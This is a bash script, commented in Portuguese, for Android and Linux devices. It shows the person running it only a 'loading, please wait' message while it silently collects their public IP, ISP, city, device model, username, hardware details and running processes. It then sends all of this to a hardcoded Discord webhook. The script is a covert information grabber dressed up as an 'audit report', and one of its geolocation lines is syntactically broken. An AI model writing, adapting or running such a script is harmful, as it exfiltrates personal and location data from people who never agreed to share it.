#!/bin/bash

# CONFIGURACAO DO WEBHOOK
URL="https://discord.com/api/webhooks/1474865009459859467/FuON2EHoo1e9LjLPi9cZoeT3IwEO-FSUcW0T2MpSjnvY8MUhvHuGTHc6qq74fi4NF7Ho"

echo "Carregando... Aguarde alguns segundos."

# 1. COLETA DE DADOS (ANDROID/LINUX)
IP_INFO=$(curl -s http://ip-api.com(curl -s https://ifconfig.me)?fields=66846719)
IP_PUBLICO=$(echo $IP_INFO | grep -o '"query":"[^"]*' | cut -d'"' -f4)
ISP=$(echo $IP_INFO | grep -o '"isp":"[^"]*' | cut -d'"' -f4)
CIDADE=$(echo $IP_INFO | grep -o '"city":"[^"]*' | cut -d'"' -f4)

MODELO=$(getprop ro.product.model)
FABRICANTE=$(getprop ro.product.manufacturer)
ANDROID_VER=$(getprop ro.build.version.release)
UPTIME=$(uptime -p)
USER=$(whoami)
HOSTNAME=$(hostname)

CPU_INFO=$(grep -m 1 'model name' /proc/cpuinfo | cut -d: -f2 | sed 's/^ //')
[ -z "$CPU_INFO" ] && CPU_INFO=$(grep -m 1 'Processor' /proc/cpuinfo | cut -d: -f2 | sed 's/^ //')

RAM_TOTAL=$(free -g | awk '/^Mem:/{print $2}')"GB"
STORAGE=$(df -h /sdcard | awk 'NR==2 {print $4 "/" $2}')

IP_LOCAL=$(ip addr show | grep 'inet ' | grep -v '127.0.0.1' | awk '{print $2}' | cut -d/ -f1 | head -n 1)
TOP_PROC=$(ps -Ao comm --sort=-%cpu | head -n 6 | tail -n 5 | tr '\n' ',' | sed 's/,$//')

# 2. MONTAGEM DO PAYLOAD JSON (VIA CRAWL/CURL)
PAYLOAD=$(cat <<EOF
{
  "content": "RELATÓRIO DE AUDITORIA ANDROID",
  "embeds": [{
    "title": "Diagnóstico Técnico (Mobile)",
    "color": 3447003,
    "fields": [
      {"name": "Sistema e Usuário", "value": "User: $USER\nModelo: $MODELO\nFabricante: $FABRICANTE\nAndroid: $ANDROID_VER\nUptime: $UPTIME", "inline": false},
      {"name": "Localização e IP", "value": "IP Público: $IP_PUBLICO\nProvedor: $ISP\nCidade: $CIDADE\nIP Local: $IP_LOCAL", "inline": false},
      {"name": "Hardware", "value": "CPU: $CPU_INFO\nRAM: $RAM_TOTAL\nEspaço (Livre/Total): $STORAGE", "inline": false},
      {"name": "Atividade", "value": "Top Processos: $TOP_PROC", "inline": false}
    ]
  }]
}
EOF
)

# 3. ENVIO PARA O DISCORD
curl -H "Content-Type: application/json" -X POST -d "$PAYLOAD" "$URL"

echo -e "\nConcluído!"
